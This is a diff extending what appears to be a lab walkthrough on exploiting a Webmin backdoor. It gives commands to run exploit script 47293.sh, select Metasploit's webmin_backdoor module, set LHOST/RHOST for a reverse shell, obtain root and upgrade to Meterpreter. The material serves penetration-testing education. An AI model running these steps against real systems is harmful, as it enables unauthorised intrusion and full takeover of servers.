@@ -83,10 +83,62 @@ Let's execute the exploit now.
 ./47293.sh http://<IP ADDRESS OF THE WEB SERVER>:10000
 ```
 <br>
+<img width="860" height="55" alt="image" src="https://github.com/user-attachments/assets/4f9a0676-77f9-441a-8df4-38713e647105" />
+<br>
 
+## Running Metasploit
 
+To run ```metasploit```, we will the command:
+```
+msfconsole -q
+```
+<br>
 
+We will then searh for the ```Webmin``` exploit.
+<br>
+<img width="1738" height="480" alt="image" src="https://github.com/user-attachments/assets/85d9bb52-7899-4e83-a2a7-8e186263cc89" />
+<br>
 
+Based on the description of the modules, we can deduce that the correct module to use is the module with the ID of 10:```exploit/linux/http/webmin_backdoor```. to select the exploit, we use the command:
+<br>
+<img width="575" height="71" alt="image" src="https://github.com/user-attachments/assets/662d982c-ada4-4662-a736-ba9a1ab48d16" />
+<br>
+
+This module will require you to configure the target IP ```(RHOSTS)``` and the listener IP ```(LHOST)``` for the reverse connection upon successful execution of the payload. This can be done by running the following commands:
+```
+set LHOST <IP ADDRESS OF YOUR MACHINE>
+```
+```
+set RHOST <IP ADDRESS OF THE TARGET MACHINE>
+```
+<br>
+
+You can use the ```show options``` command to verify:
+<br>
+<img width="1889" height="820" alt="image" src="https://github.com/user-attachments/assets/48848ed7-5665-497c-b62e-f630059a0f1a" />
+<br>
+
+let's run it now using the ```exploit``` command:
+<br>
+<img width="1264" height="172" alt="image" src="https://github.com/user-attachments/assets/9da75636-0f3d-4992-a669-99e80a28768e" />
+<br>
+
+Based on the image, the exploit runs successfully and we obtain a command shell with root privileges.
+
+## Using Meterpreter
+
+Let's Backkground the session  using the ```Ctrl + z``` then type ```y```.
+<br>
+<img width="376" height="45" alt="image" src="https://github.com/user-attachments/assets/1b02b30a-32d8-4863-80b3-adf83e79de98" />
+<br>
+
+To  upgrade the command shell session to a [meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/) session, We will use the command:
+```
+sessions -u 1
+```
+<br>
+<img width="1220" height="184" alt="image" src="https://github.com/user-attachments/assets/c8c9cbcb-184a-41cc-be05-5753e4f71833" />
+<br>
 
 
 
